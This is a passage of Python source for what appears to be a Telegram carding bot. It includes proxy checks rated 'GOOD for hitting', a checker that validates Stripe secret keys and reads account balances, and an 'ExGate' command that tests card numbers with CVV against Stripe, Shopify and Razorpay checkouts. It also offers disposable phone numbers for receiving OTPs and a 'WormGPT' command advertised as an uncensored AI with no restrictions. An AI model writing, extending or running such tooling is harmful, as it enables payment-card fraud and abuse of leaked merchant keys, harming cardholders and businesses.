                f"{EMOJI['charged']} <code>{r['proxy']}</code>\n"
                f"   IP ~ <code>{r['ip']}</code>\n"
                f"   Country ~ <code>{r['country']}</code> (<code>{r['country_code']}</code>)\n"
                f"   ISP ~ <code>{r['isp']}</code>\n"
                f"   Type ~ <code>{r['type']}</code>{proxy_flag}\n"
                f"   Latency ~ <code>{r['ms']}ms</code>\n"
                f"   Fraud ~ {fraud_line}\n"
                f"   Stripe ~ {stripe_status}{stripe_lat}"
            )
        else:
            blocks.append(
                f"{EMOJI['declined']} <code>{r['proxy']}</code>\n"
                f"   Error ~ {r['error']}"
            )

    text = (
        f"💜 <b>PROXY • CHECK</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📊 Total : {len(proxies)} | ✅ {len(alive)} | ❌ {len(dead)}\n"
        f"💳 Stripe OK : {len(stripe_ok)}/{len(alive)}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        + "\n\n".join(blocks)
    )
    if len(proxies) > 10:
        text += f"\n\n<i>... and {len(proxies)-10} more</i>"
    text += "\n\n<i>Fraud data by proxycheck.io</i>"

    await status_msg.edit_text(text[:4096], parse_mode=ParseMode.HTML)


async def _proxy_toggle_mode(message, uid, mode_arg):
    if mode_arg in ("own", "personal", "mine"):
        user_proxies = ah_get_user_proxies(uid)
        if not user_proxies:
            await message.reply_text(f"{EMOJI['declined']} Add a proxy first with <code>/proxy add</code>.", parse_mode=ParseMode.HTML)
            return
        set_user_proxy_mode(uid, "own")
        await message.reply_text(f"{EMOJI['charged']} Proxy mode set to <b>Own Proxy</b>. Your proxies will be used for hitting.", parse_mode=ParseMode.HTML)
    elif mode_arg in ("system", "pool", "default"):
        set_user_proxy_mode(uid, "system")
        await message.reply_text(f"{EMOJI['plug']} Proxy mode set to <b>System Proxy</b>. System pool will be used.", parse_mode=ParseMode.HTML)
    else:
        current = get_user_proxy_mode(uid)
        mode_text = "Own Proxy" if current == "own" else "System Proxy"
        await message.reply_text(
            f"💜 <b>PROXY • MODE</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"⚡ Current : <b>{mode_text}</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"/proxy mode own · /proxy mode system",
            parse_mode=ParseMode.HTML
        )


async def _proxy_check_only(message, uid, proxy_str):
    if not proxy_str:
        await message.reply_text(
            f"💜 <b>PROXY • CHECK</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"/proxy [proxy] — Check only\n"
            f"/proxy add [proxy] — Check + save",
            parse_mode=ParseMode.HTML,
        )
        return

    status_msg = await message.reply_text(f"{EMOJI['hitting']} Checking proxy...", parse_mode=ParseMode.HTML)

    r = await test_proxy(proxy_str)

    if not r["alive"]:
        await status_msg.edit_text(
            f"💜 <b>PROXY • CHECK</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"{EMOJI['declined']} <code>{html.escape(proxy_str)}</code>\n"
            f"❌ {html.escape(str(r['error']))}\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"<i>Dead — not saved.</i>",
            parse_mode=ParseMode.HTML,
        )
        return

    stripe_s = f"{EMOJI['charged']} YES ({r['stripe_ms']}ms)" if r["stripe"] else f"{EMOJI['declined']} NO"
    fs = r.get("fraud_score")
    if fs is not None:
        if fs <= 20:
            fraud_line = f"{EMOJI['charged']} <code>{fs}/100</code> (Clean)"
        elif fs <= 50:
            fraud_line = f"{EMOJI['error']} <code>{fs}/100</code> (Medium)"
        else:
            fraud_line = f"{EMOJI['danger']} <code>{fs}/100</code> (Risky)"
    else:
        fraud_line = "─"

    _checked_proxies[uid] = proxy_str
    kb = InlineKeyboardMarkup([
        [
            _btn("Save Proxy", style="success", icon=EID["charged"], callback_data=f"saveproxy_{uid}"),
            _btn("Discard", style="default", icon=EID["declined"], callback_data=f"discardproxy_{uid}"),
        ]
    ])
    text = (
        f"💜 <b>PROXY • CHECK</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"{EMOJI['charged']} <code>{html.escape(proxy_str)}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🌐 <b>IP</b>      : <code>{html.escape(str(r['ip']))}</code>\n"
        f"🌍 <b>Country</b> : {html.escape(str(r['country']))} ({html.escape(str(r['country_code']))})\n"
        f"🏢 <b>ISP</b>     : {html.escape(str(r['isp']))}\n"
        f"📡 <b>Type</b>    : {html.escape(str(r['type']))}\n"
        f"⏱ <b>Latency</b> : {r['ms']}ms\n"
        f"🛡 <b>Fraud</b>   : {fraud_line}\n"
        f"💳 <b>Stripe</b>  : {stripe_s}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"Save this proxy?"
    )
    await status_msg.edit_text(text, reply_markup=kb, parse_mode=ParseMode.HTML)


async def save_proxy_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    uid = int(query.data.split("_")[1])
    if query.from_user.id != uid:
        await query.answer("Not your session.", show_alert=True)
        return
    proxy_str = _checked_proxies.pop(uid, None)
    if not proxy_str:
        await query.answer("Session expired.", show_alert=True)
        return
    ah_add_user_proxy(uid, proxy_str)
    await query.answer("Proxy saved!")
    await query.edit_message_text(
        f"{EMOJI['charged']} Proxy <code>{proxy_str}</code> saved to your account.",
        parse_mode=ParseMode.HTML,
    )


async def discard_proxy_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    uid = int(query.data.split("_")[1])
    if query.from_user.id != uid:
        await query.answer("Not your session.", show_alert=True)
        return
    _checked_proxies.pop(uid, None)
    await query.answer("Discarded.")
    await query.edit_message_text(
        f"{EMOJI['declined']} Proxy discarded. Not saved.",
        parse_mode=ParseMode.HTML,
    )


# ============================================================================
# IP CHECK — /ipcheck [ip]
# ============================================================================

@require_approval
async def ipcheck_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    uid = user.id
    args = context.args if context.args else []
    ip_to_check = None
    proxy_str = None
    label = "Bot Hosting IP"

    if args and args[0].lower() == "proxy":
        mode = get_user_proxy_mode(uid)
        if mode == "own":
            user_proxies = ah_get_user_proxies(uid)
            if user_proxies:
                proxy_str = user_proxies[0]
                label = "Your Proxy IP"
        if not proxy_str:
            from config import SYSTEM_PROXIES
            if SYSTEM_PROXIES:
                proxy_str = random.choice(SYSTEM_PROXIES)
                label = "System Proxy IP"
        if not proxy_str:
            await update.message.reply_text(f"{EMOJI['declined']} No proxy configured.", parse_mode=ParseMode.HTML)
            return
    elif args:
        ip_to_check = args[0].strip()
        label = f"IP <code>{html.escape(ip_to_check)}</code>"

    status_msg = await update.message.reply_text(
        f"{EMOJI['hitting']} Checking {label}...",
        parse_mode=ParseMode.HTML
    )

    try:
        result = await check_ip_info(ip_to_check, proxy_str)

        if result.get("error"):
            err_msg = re.sub(r'https?://[^\s,\'\"]+', '[proxy]', str(result['error']))
            await status_msg.edit_text(f"{EMOJI['declined']} Error: {html.escape(err_msg)}", parse_mode=ParseMode.HTML)
            return

        country = result.get("country", "?")
        cc = result.get("country_code", "?")
        isp = result.get("isp", "?")
        ip_type = result.get("ip_type", "Unknown")
        flag = get_flag_emoji(cc)

        fs = result.get("fraud_score")
        if fs is not None:
            if fs <= 20:
                fraud_line = f"{EMOJI['charged']} <code>{fs}/100</code> (Clean)"
            elif fs <= 50:
                fraud_line = f"{EMOJI['error']} <code>{fs}/100</code> (Medium)"
            elif fs <= 75:
                fraud_line = f"{EMOJI['risky']} <code>{fs}/100</code> (Risky)"
            else:
                fraud_line = f"{EMOJI['danger']} <code>{fs}/100</code> (High Risk)"
        else:
            fraud_line = "─ (unavailable)"

        flags = []
        if result.get("is_proxy") == "yes":
            flags.append("Proxy")
        if result.get("is_vpn") == "yes":
            flags.append("VPN")
        flag_str = f" [{', '.join(flags)}]" if flags else ""

        stripe_ok = result.get("stripe", False)
        stripe_ms = result.get("stripe_ms")
        stripe_line = f"{EMOJI['charged']} YES ({stripe_ms}ms)" if stripe_ok else f"{EMOJI['declined']} NO"

        text = (
            f"💜 <b>ONICHAN • IP</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🌐 <b>IP</b>      : <code>{result.get('ip', '?')}</code>\n"
            f"🌍 <b>Country</b> : {flag} {country} ({cc})\n"
            f"🏢 <b>ISP</b>     : {isp}\n"
            f"📡 <b>Type</b>    : {ip_type}{flag_str}\n"
            f"🛡 <b>Fraud</b>   : {fraud_line}\n"
            f"💳 <b>Stripe</b>  : {stripe_line}\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
        )

        if stripe_ok and (fs is None or fs <= 50):
            text += f"\n{EMOJI['charged']} <b>GOOD for hitting</b>"
        elif stripe_ok and fs and fs <= 75:
            text += f"\n{EMOJI['error']} <b>Usable but risky</b>"
        elif not stripe_ok:
            text += f"\n{EMOJI['declined']} <b>Cannot reach Stripe</b>"
        else:
            text += f"\n{EMOJI['danger']} <b>High fraud score — likely blocked</b>"

        text += "\n\n<i>Fraud data by proxycheck.io</i>"
        try: await status_msg.delete()
        except Exception: pass
        await _reply_with_gif(update.message, "welcome", text)

    except Exception as e:
        await status_msg.edit_text(f"{EMOJI['declined']} Error: {str(e)[:60]}", parse_mode=ParseMode.HTML)


# ============================================================================
# SK CHECKER - STRIPE SECRET KEY INFO
# ============================================================================

@require_approval
async def sk_check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check Stripe Secret Key info"""
    user = update.effective_user

    if not context.args:
        await update.message.reply_text(
            "🔑 <b>SK Checker</b>\n\n"
            "<b>Usage:</b> <code>/sk &lt;secret_key&gt;</code>\n\n"
            "<b>Example:</b>\n"
            "<code>/sk sk_live_xxxxxxxxxxxx</code>\n\n"
            "Returns account info, balance, and charge status.",
            parse_mode=ParseMode.HTML
        )
        return

    sk = context.args[0].strip()

    if not sk.startswith("sk_live_") and not sk.startswith("sk_test_"):
        await update.message.reply_text(
            "❌ <b>Invalid SK</b>\n\nMust start with <code>sk_live_</code> or <code>sk_test_</code>",
            parse_mode=ParseMode.HTML
        )
        return

    loading_msg = await update.message.reply_text(
        "🔍 <b>Checking SK...</b>\n\n⏳ Fetching account info...",
        parse_mode=ParseMode.HTML
    )

    try:
        import httpx
        async with httpx.AsyncClient(timeout=15) as session:
            headers = {"Authorization": f"Bearer {sk}"}
            skinfo_resp = await session.get("https://api.stripe.com/v1/account", headers=headers)
            skinfo = skinfo_resp.json()

            if "error" in skinfo:
                err_msg = skinfo["error"].get("message", "Invalid or expired SK")
                await loading_msg.edit_text(
                    f"❌ <b>SK Check Failed</b>\n\n{html.escape(err_msg)}",
                    parse_mode=ParseMode.HTML
                )
                return

            balance_resp = await session.get("https://api.stripe.com/v1/balance", headers=headers)
            balance_info = balance_resp.json()

        charges_enabled = skinfo.get("charges_enabled", False)
        payouts_enabled = skinfo.get("payouts_enabled", False)
        biz = skinfo.get("business_profile", {})
        url = biz.get("url") or "N/A"
        name_data = biz.get("name") or "N/A"
        currency = (skinfo.get("default_currency") or "N/A").upper()
        country = skinfo.get("country") or "N/A"
        email = skinfo.get("email") or "N/A"
        sk_type = skinfo.get("type") or "N/A"

        available_raw = balance_info.get("available", [{}])
        pending_raw = balance_info.get("pending", [{}])
        livemode = balance_info.get("livemode", False)

        available_parts = []
        for b in available_raw:
            amt = b.get("amount", 0)
            cur = (b.get("currency") or "").upper()
            available_parts.append(f"{amt/100:.2f} {cur}")
        available_str = ", ".join(available_parts) if available_parts else "0.00"

        pending_parts = []
        for b in pending_raw:
            amt = b.get("amount", 0)
            cur = (b.get("currency") or "").upper()
            pending_parts.append(f"{amt/100:.2f} {cur}")
        pending_str = ", ".join(pending_parts) if pending_parts else "0.00"

        charges_icon = "✅" if charges_enabled else "❌"
        payouts_icon = "✅" if payouts_enabled else "❌"
        live_icon = "✅" if livemode else "❌"

        masked_sk = f"{sk[:7]}...{sk[-4:]}" if len(sk) > 12 else sk

        resp = (
            f"<b>SK Info Fetched Successfully ✅</b>\n"
            f"━━━━━━━━━━━━━━\n"
            f"🔑 <b>SK:</b> <code>{html.escape(masked_sk)}</code>\n"
            f"🏢 <b>Name:</b> {html.escape(str(name_data))}\n"
            f"🌐 <b>Website:</b> {html.escape(str(url))}\n"
            f"🌍 <b>Country:</b> {html.escape(str(country))}\n"
            f"💱 <b>Currency:</b> {html.escape(str(currency))}\n"
            f"📧 <b>Email:</b> {html.escape(str(email))}\n"
            f"🏷️ <b>Type:</b> {html.escape(str(sk_type))}\n"
            f"━━━━━━━━━━━━━━\n"
            f"💰 <b>Balance Info:</b>\n"
            f"   {live_icon} Live Mode: {livemode}\n"
            f"   {charges_icon} Charges Enabled: {charges_enabled}\n"
            f"   {payouts_icon} Payouts Enabled: {payouts_enabled}\n"
            f"   💵 Available: {html.escape(available_str)}\n"
            f"   ⏳ Pending: {html.escape(pending_str)}\n"
            f"━━━━━━━━━━━━━━\n"
            f"<b>Checked By:</b> <a href='tg://user?id={user.id}'>{html.escape(user.first_name)}</a>"
        )

        try: await loading_msg.delete()
        except Exception: pass
        await _reply_with_gif(update.message, "success", resp)

    except Exception as e:
        await loading_msg.edit_text(
            f"❌ <b>Error checking SK</b>\n\n{html.escape(str(e)[:200])}",
            parse_mode=ParseMode.HTML
        )

# ============================================================================
# EXGATE — EXTRACTED GATE CHECKER (sk-based / shopify / razorpay)
# Reverse-engineered from approvedchkr.store/api/v1/check.php
# ============================================================================

@require_approval
async def gate_exgate(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    /exgate <gateway> <cc|mm|yy|cvv> [key=val ...]

    Gateways
    ─────────
    sk-based  sk=<SK>  pk=<PK>                → PK tokenises, SK charges (real browser flow)
    shopify   url=<store_url>                  → Full Shopify site checkout
    razorpay  rzpid=<key_id>  rzpsec=<secret>  → Razorpay order + card payment
    api       (any above) uses approvedchkr.store external API (needs apikey=<key>)
    """
    from modules.gate_status import is_gate_offline, offline_message
    if is_gate_offline("exgate"):
        await update.message.reply_text(offline_message("exgate"), parse_mode=ParseMode.HTML)
        return
    from modules.gate_checker import (
        check_sk_pk_gate,
        check_shopify_site_gate,
        check_razorpay_session_gate,
        check_approvedchkr_api,
        get_bin_info,
    )

    user = update.effective_user
    args = context.args or []

    USAGE = (
        "🔓 <b>ExGate — Extracted Gate Checker</b>\n\n"
        "<b>Usage:</b>\n"
        "<code>/exgate sk-based 4242...4242|01|26|123 sk=sk_live_xxx pk=pk_live_xxx</code>\n"
        "<code>/exgate shopify  4242...4242|01|26|123 url=https://store.com</code>\n"
        "<code>/exgate razorpay 4242...4242|01|26|123 rzpid=rzp_live_x rzpsec=secret</code>\n\n"
        "<b>Gateways:</b>\n"
        "• <code>sk-based</code> — PK browser-tokenises → SK charges (stealthiest)\n"
        "• <code>shopify</code>  — Full Shopify checkout on a real store\n"
        "• <code>razorpay</code> — Razorpay order + card payment\n\n"
        "<i>Reverse-engineered from approvedchkr.store</i>"
    )

    if len(args) < 2:
        await update.message.reply_text(USAGE, parse_mode=ParseMode.HTML)
        return

    gateway = args[0].lower()
    card_raw = args[1]

    # Parse key=val extra params
    kv = {}
    for part in args[2:]:
        if '=' in part:
            k, _, v = part.partition('=')
            kv[k.lower()] = v

    # Parse card
    card_parts = [x.strip() for x in card_raw.split('|')]
    if len(card_parts) != 4:
        await update.message.reply_text(
            "❌ Card must be <code>cc|mm|yy|cvv</code>", parse_mode=ParseMode.HTML
        )
        return
    cc, mm, yy, cvv = card_parts

    # Loading msg
    loading = await update.message.reply_text(
        f"⏳ <b>ExGate</b> — running <code>{gateway}</code> gate...",
        parse_mode=ParseMode.HTML
    )

    try:
        t0 = time_module.time()

        if gateway == 'sk-based':
            sk = kv.get('sk', '')
            pk = kv.get('pk', '')
            if not sk or not pk:
                await loading.edit_text(
                    "❌ sk-based needs <code>sk=</code> and <code>pk=</code>",
                    parse_mode=ParseMode.HTML
                )
                return
            result = await asyncio.to_thread(check_sk_pk_gate, cc, mm, yy, cvv, sk, pk)

        elif gateway == 'shopify':
            url = kv.get('url', '')
            if not url:
                await loading.edit_text(
                    "❌ shopify needs <code>url=https://store.com</code>",
                    parse_mode=ParseMode.HTML
                )
                return
            result = await asyncio.to_thread(check_shopify_site_gate, cc, mm, yy, cvv, url)

        elif gateway == 'razorpay':
            rzpid = kv.get('rzpid', '')
            rzpsec = kv.get('rzpsec', '')
            if not rzpid or not rzpsec:
                await loading.edit_text(
                    "❌ razorpay needs <code>rzpid=</code> and <code>rzpsec=</code>",
                    parse_mode=ParseMode.HTML
                )
                return
            result = await asyncio.to_thread(check_razorpay_session_gate, cc, mm, yy, cvv, rzpid, rzpsec)

        else:
            await loading.edit_text(
                f"❌ Unknown gateway <code>{html.escape(gateway)}</code>. Use: sk-based | shopify | razorpay",
                parse_mode=ParseMode.HTML
            )
            return

        elapsed = result.get('time', round(time_module.time() - t0, 2))
        msg_raw = result.get('message', 'No response')
        status  = result.get('status', 'error')

        # BIN lookup
        try:
            bin_info = await asyncio.to_thread(get_bin_info, cc[:6])
        except Exception:
            bin_info = {}

        bin_brand   = bin_info.get('scheme', bin_info.get('brand', 'Unknown')).title()
        bin_type    = bin_info.get('type', bin_info.get('card_type', 'Unknown')).title()
        bin_bank    = bin_info.get('bank', {}).get('name', 'Unknown') if isinstance(bin_info.get('bank'), dict) else bin_info.get('bank', 'Unknown')
        bin_country = (bin_info.get('country', {}).get('emoji', '') if isinstance(bin_info.get('country'), dict)
                       else '') + ' ' + (bin_info.get('country', {}).get('name', '') if isinstance(bin_info.get('country'), dict)
                       else bin_info.get('country', ''))

        # Determine icon
        if status == 'error':
            icon = '⚠️'
            label = 'ERROR'
        elif any(w in msg_raw.lower() for w in ('approved', 'charged', 'valid', '3ds', 'capture')):
            icon = '✅'
            label = 'APPROVED'
        else:
            icon = '❌'
            label = 'DECLINED'

        GATE_NAMES = {
            'sk-based': 'SK+PK Based',
            'shopify':  'Shopify Site',
            'razorpay': 'Razorpay Direct',
        }
        gate_display = GATE_NAMES.get(gateway, gateway.upper())

        resp = (
            f"{icon} <b>ExGate — {gate_display}</b>\n\n"
            f"<b>Card:</b> <code>{cc}|{mm}|{yy}|{cvv}</code>\n"
            f"<b>Status:</b> {label}\n"
            f"<b>Response:</b> {html.escape(msg_raw)}\n\n"
            f"<b>BIN:</b> {cc[:6]}\n"
            f"<b>Brand:</b> {html.escape(str(bin_brand))}\n"
            f"<b>Type:</b>  {html.escape(str(bin_type))}\n"
            f"<b>Bank:</b>  {html.escape(str(bin_bank))}\n"
            f"<b>Country:</b> {html.escape(str(bin_country).strip())}\n\n"
            f"<b>Gateway:</b> {gate_display}\n"
            f"<b>Time:</b> {elapsed}s\n"
            f"<b>By:</b> <a href='tg://user?id={user.id}'>{html.escape(user.first_name)}</a>"
        )

        try:
            await loading.delete()
        except Exception:
            pass

        gif_type = 'approved' if label == 'APPROVED' else 'declined' if label == 'DECLINED' else 'error'
        await _reply_with_gif(update.message, gif_type, resp)

    except Exception as e:
        await loading.edit_text(
            f"❌ <b>ExGate error</b>\n\n{html.escape(str(e)[:200])}",
            parse_mode=ParseMode.HTML
        )


# ============================================================================
# TEMPORARY PHONE NUMBER
# ============================================================================

from modules.temp_phone import get_temp_number, get_countries_list, refresh_sms, get_flag

temp_phone_user_numbers = {}

@require_approval
async def temp_phone_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Get temporary phone number for SMS verification"""
    user = update.effective_user
    
    country = None
    if context.args:
        country = ' '.join(context.args)
    
    loading_msg = await update.message.reply_text(
        "📱 <b>Fetching temporary phone number...</b>\n\n"
        "⏳ Please wait...",
        parse_mode=ParseMode.HTML
    )
    
    try:
        result = await get_temp_number(country)
        
        if not result["success"]:
            error_msg = result.get("error", "Unknown error")
            if "available_countries" in result:
                countries = result["available_countries"][:15]
                countries_text = ", ".join(countries)
                error_msg += f"\n\n<b>Available countries:</b>\n{countries_text}..."
            
            await loading_msg.edit_text(
                f"❌ <b>Failed to get number</b>\n\n{error_msg}",
                parse_mode=ParseMode.HTML
            )
            return
        
        number = result["number"]
        country_name = result["country"]
        flag = get_flag(country_name)
        messages = result["messages"]
        last_update = result.get("last_update", "Unknown")
        
        temp_phone_user_numbers[user.id] = {
            "number": number,
            "country_code": result.get("country_code", "")
        }
        
        msg_text = f"""📱 <b>Temporary Phone Number</b>

{flag} <b>Country:</b> {country_name}
📞 <b>Number:</b> <code>{number}</code>
🕐 <b>Last Activity:</b> {last_update}

<i>Use this number for SMS verification. Messages will appear below.</i>

"""
        
        if messages:
            msg_text += f"📨 <b>Recent Messages ({len(messages)}):</b>\n\n"
            for i, sms in enumerate(messages[:5], 1):
                sender = sms.get("FromNumber", "Unknown")
                body = sms.get("Messagebody", "")[:150]
                time = sms.get("message_time", "")
                codes = sms.get("codes", [])
                msg_text += f"<b>{i}. From:</b> {sender}\n"
                msg_text += f"<b>Message:</b> {body}\n"
                if codes:
                    msg_text += f"🔑 <b>OTP:</b> <code>{', '.join(codes)}</code>\n"
                msg_text += f"<b>Time:</b> {time}\n\n"
        else:
            msg_text += "📭 <i>No messages yet. Waiting for SMS...</i>\n"
        
        keyboard = [
            [_btn("Refresh Messages", style="success", icon=EID["regenerate"], callback_data=f"tpno_refresh_{number}")],
            [_btn("Get New Number", icon=EID["bolt"], callback_data="tpno_new")],
            [_btn("Choose Country", style="default", icon=EID["search"], callback_data="tpno_countries")]
        ]
        
        await loading_msg.edit_text(
            msg_text,
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        
    except Exception as e:
        await loading_msg.edit_text(
            f"❌ <b>Error:</b> {str(e)[:200]}",
            parse_mode=ParseMode.HTML
        )

async def temp_phone_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle temp phone callbacks"""
    query = update.callback_query
    await query.answer()
    user = query.from_user
    data = query.data
    
    if data.startswith("tpno_refresh_"):
        number = data.replace("tpno_refresh_", "")
        
        await query.edit_message_text(
            "🔄 <b>Refreshing messages...</b>",
            parse_mode=ParseMode.HTML
        )
        
        try:
            user_data = temp_phone_user_numbers.get(user.id, {})
            country_code = user_data.get("country_code", "") if isinstance(user_data, dict) else ""
            messages = await refresh_sms(country_code, number)
            
            msg_text = f"""📱 <b>Messages for {number}</b>

"""
            if messages:
                msg_text += f"📨 <b>Messages ({len(messages)}):</b>\n\n"
                for i, sms in enumerate(messages[:8], 1):
                    sender = sms.get("FromNumber", "Unknown")
                    body = sms.get("Messagebody", "")[:150]
                    time = sms.get("message_time", "")
                    codes = sms.get("codes", [])
                    msg_text += f"<b>{i}. From:</b> {sender}\n"
                    msg_text += f"<b>Message:</b> {body}\n"
                    if codes:
                        msg_text += f"🔑 <b>OTP:</b> <code>{', '.join(codes)}</code>\n"
                    msg_text += f"<b>Time:</b> {time}\n\n"
            else:
                msg_text += "📭 <i>No messages yet. Keep waiting...</i>\n"
            
            keyboard = [
                [_btn("Refresh Again", style="success", icon=EID["regenerate"], callback_data=f"tpno_refresh_{number}")],
                [_btn("Get New Number", icon=EID["bolt"], callback_data="tpno_new")]
            ]
            
            await query.edit_message_text(
                msg_text,
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        except Exception as e:
            await query.edit_message_text(f"❌ Error: {str(e)[:100]}", parse_mode=ParseMode.HTML)
    
    elif data == "tpno_new":
        await query.edit_message_text(
            "📱 <b>Getting new number...</b>",
            parse_mode=ParseMode.HTML
        )
        
        try:
            result = await get_temp_number()
            
            if result["success"]:
                number = result["number"]
                country_name = result["country"]
                flag = get_flag(country_name)
                
                temp_phone_user_numbers[user.id] = number
                
                msg_text = f"""📱 <b>New Temporary Number</b>

{flag} <b>Country:</b> {country_name}
📞 <b>Number:</b> <code>{number}</code>

📭 <i>No messages yet. Waiting for SMS...</i>
"""
                keyboard = [
                    [_btn("Refresh Messages", style="success", icon=EID["regenerate"], callback_data=f"tpno_refresh_{number}")],
                    [_btn("Get Another", icon=EID["bolt"], callback_data="tpno_new")]
                ]
                
                await query.edit_message_text(
                    msg_text,
                    parse_mode=ParseMode.HTML,
                    reply_markup=InlineKeyboardMarkup(keyboard)
                )
            else:
                await query.edit_message_text(f"❌ {result.get('error', 'Failed')}", parse_mode=ParseMode.HTML)
        except Exception as e:
            await query.edit_message_text(f"❌ Error: {str(e)[:100]}", parse_mode=ParseMode.HTML)
    
    elif data == "tpno_countries":
        try:
            countries = await get_countries_list()
            
            msg_text = "🌍 <b>Available Countries</b>\n\n"
            for c in countries[:30]:
                msg_text += f"{c['flag']} {c['name']}\n"
            
            msg_text += "\n<b>Usage:</b> <code>/tpno usa</code> or <code>/tpno india</code>"
            
            keyboard = [[_btn("BACK", style="default", icon=EID["back"], callback_data="tpno_new")]]
            
            await query.edit_message_text(
                msg_text,
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        except Exception as e:
            await query.edit_message_text(f"❌ Error: {str(e)[:100]}", parse_mode=ParseMode.HTML)

# ============================================================================
# AI CHAT - /ask COMMAND
# ============================================================================

@require_approval
async def ask_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Ask AI anything using OpenRouter free models"""
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text(
            "🤖 <b>AI Assistant</b>\n\n"
            "<b>Usage:</b> <code>/ask your question here</code>\n\n"
            "<b>Examples:</b>\n"
            "• <code>/ask What is Bitcoin?</code>\n"
            "• <code>/ask Explain quantum computing</code>\n"
            "• <code>/ask Write a Python hello world</code>",
            parse_mode=ParseMode.HTML
        )
        return
    
    question = ' '.join(context.args)
    
    if len(question) > 2000:
        await update.message.reply_text(ae("❌ Question too long. Max 2000 characters."))
        return
    
    _loading_gif = get_sexy_anime_gif("loading")
    if _loading_gif:
        loading_msg = await update.message.reply_animation(
            animation=_loading_gif,
            caption="🤖 <b>AI is thinking...</b>\n\n⏳ Please wait...",
            parse_mode=ParseMode.HTML
        )
    else:
        loading_msg = await update.message.reply_text(
            "🤖 <b>AI is thinking...</b>\n\n⏳ Please wait...",
            parse_mode=ParseMode.HTML
        )
    
    try:
        result = await ask_ai(question, user.id)
        
        if result["success"]:
            answer = sanitize_ai_response(result["answer"])
            model = result.get("model", "AI")
            
            if len(answer) > 4000:
                answer = answer[:4000] + "...\n\n<i>(Response truncated)</i>"
            
            safe_question = html_escape(question[:100])
            response_text = f"""🤖 <b>AI Response</b>

<b>Question:</b> {safe_question}{'...' if len(question) > 100 else ''}

<b>Answer:</b>
{answer}

<i>Powered by {model}</i>"""
            
            try: await loading_msg.delete()
            except Exception: pass
            await update.message.reply_text(response_text, parse_mode=ParseMode.HTML)
        else:
            error = result.get("error", "Unknown error")
            await loading_msg.edit_text(
                f"❌ <b>AI Error</b>\n\n{error}",
                parse_mode=ParseMode.HTML
            )
    
    except Exception as e:
        await loading_msg.edit_text(
            f"❌ <b>Error:</b> {str(e)[:200]}",
            parse_mode=ParseMode.HTML
        )

@require_approval
async def askill_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Ask WormGPT AI - uncensored AI model"""
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text(
            "🔥 <b>WormGPT - Uncensored AI</b>\n\n"
            "<b>Usage:</b> <code>/askill your question here</code>\n\n"
            "<b>Examples:</b>\n"
            "• <code>/askill How to code a bot?</code>\n"
            "• <code>/askill Explain hacking techniques</code>\n"
            "• <code>/askill Write a script for me</code>\n\n"
            "<i>No restrictions. No censorship.</i>",
            parse_mode=ParseMode.HTML
        )
        return
    
    question = ' '.join(context.args)
    
    if len(question) > 2000:
        await update.message.reply_text(ae("❌ Question too long. Max 2000 characters."))
        return
    
    _loading_gif = get_sexy_anime_gif("loading")
    if _loading_gif:
        loading_msg = await update.message.reply_animation(
            animation=_loading_gif,
            caption="🔥 <b>WormGPT is thinking...</b>\n\n⏳ Please wait...",
            parse_mode=ParseMode.HTML
        )
    else:
        loading_msg = await update.message.reply_text(
            "🔥 <b>WormGPT is thinking...</b>\n\n⏳ Please wait...",
            parse_mode=ParseMode.HTML
        )
    
    try:
        result = await ask_wormgpt(question, user.id)
        
        if result["success"]:
            answer = sanitize_ai_response(result["answer"])
            model = result.get("model", "WormGPT")
            
            if len(answer) > 4000:
                answer = answer[:4000] + "...\n\n<i>(Response truncated)</i>"
            
            safe_question = html_escape(question[:100])
            response_text = f"""🔥 <b>WormGPT Response</b>

<b>Question:</b> {safe_question}{'...' if len(question) > 100 else ''}

<b>Answer:</b>
{answer}

<i>Powered by {model} - No Limits</i>"""
            
            try: await loading_msg.delete()
            except Exception: pass
            await update.message.reply_text(response_text, parse_mode=ParseMode.HTML)
        else:
            error = result.get("error", "Unknown error")
            await loading_msg.edit_text(
                f"❌ <b>WormGPT Error</b>\n\n{error}",
                parse_mode=ParseMode.HTML
            )
    
    except Exception as e:
        await loading_msg.edit_text(
            f"❌ <b>Error:</b> {str(e)[:200]}",
            parse_mode=ParseMode.HTML
        )

# ============================================================================
# IMAGE GENERATION - /img COMMAND
# ============================================================================

OPENROUTER_IMAGE_MODELS = [
    "openai/dall-e-3",
    "stabilityai/stable-diffusion-3",
    "black-forest-labs/flux-1-schnell",
]

UNCENSORED_IMAGE_MODELS = [
    "black-forest-labs/flux-1-schnell",
    "stabilityai/stable-diffusion-xl-base-1.0",
]

@require_approval
async def img_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Generate images using OpenRouter API"""
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text(
            "🎨 <b>AI Image Generator</b>\n\n"
            "<b>Usage:</b> <code>/img your prompt here</code>\n\n"
            "<b>Examples:</b>\n"
            "• <code>/img cute anime girl with blue hair</code>\n"
            "• <code>/img cyberpunk city at night</code>\n"
